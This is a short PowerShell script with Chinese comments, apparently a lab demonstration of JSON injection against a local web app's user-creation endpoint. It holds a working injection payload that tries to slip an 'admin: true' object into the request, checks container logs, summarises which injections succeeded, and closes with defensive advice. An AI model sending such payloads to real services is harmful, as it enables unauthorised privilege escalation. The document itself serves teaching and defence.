# 高级JSON注入攻击演示

Write-Host "=== 高级JSON注入攻击 ===" -ForegroundColor Red
Write-Host ""

# 尝试完全控制JSON结构
Write-Host "🔥 高级攻击：尝试完全控制JSON结构"
$advancedPayload = '{"username": "victim\"} , \"evil_object\": {\"admin\": true, \"user\": \"hacker"}'
Write-Host "Payload: $advancedPayload"

try {
    $result = Invoke-RestMethod -Uri "http://localhost:3000/api/user/create" -Method Post -ContentType "application/json" -Body $advancedPayload
    Write-Host "结果: $result" -ForegroundColor Yellow
} catch {
    Write-Host "攻击失败: $($_.Exception.Message)" -ForegroundColor Red
}

Write-Host ""
Write-Host "🔍 让我们看看实际发生了什么..."

# 查看应用日志
Write-Host "查看容器日志:"
docker logs json_-app-1 --tail 3

Write-Host ""
Write-Host "📊 总结JSON注入攻击的影响:"
Write-Host "1. ✅ 成功注入额外字段（injected, malicious, role, access等）"
Write-Host "2. ✅ 成功注入嵌套对象结构"
Write-Host "3. ❌ 无法覆盖原始privilege字段（因为字段位置在后面）"
Write-Host "4. ❌ 复杂的JSON结构攻击被JSON.parse拒绝"

Write-Host ""
Write-Host "🛡️ 防御建议:"
Write-Host "1. 使用JSON.parse解析请求体，而不是字符串拼接"
Write-Host "2. 验证和清理所有用户输入"
Write-Host "3. 使用白名单验证允许的字段"
Write-Host "4. 实施输入长度限制"
